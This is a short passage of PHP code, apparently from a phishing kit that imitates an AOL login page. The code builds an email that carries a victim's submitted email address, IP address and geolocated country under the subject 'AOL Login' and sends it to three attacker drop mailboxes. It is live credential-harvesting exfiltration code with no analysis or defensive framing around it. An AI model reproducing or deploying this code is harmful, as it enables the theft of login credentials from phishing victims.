...
$message .= "\n";
$sent ="greygreygreyy@gmail.com,readystuffx@yahoo.com,incoverslogs@hotmail.com";
$subject = "AOL Login | $ip | {$geoplugin->countryName} | ".$_POST['email'];
$headers = "Result";
$headers = "From:YM:readystuffx <noreply>";
{
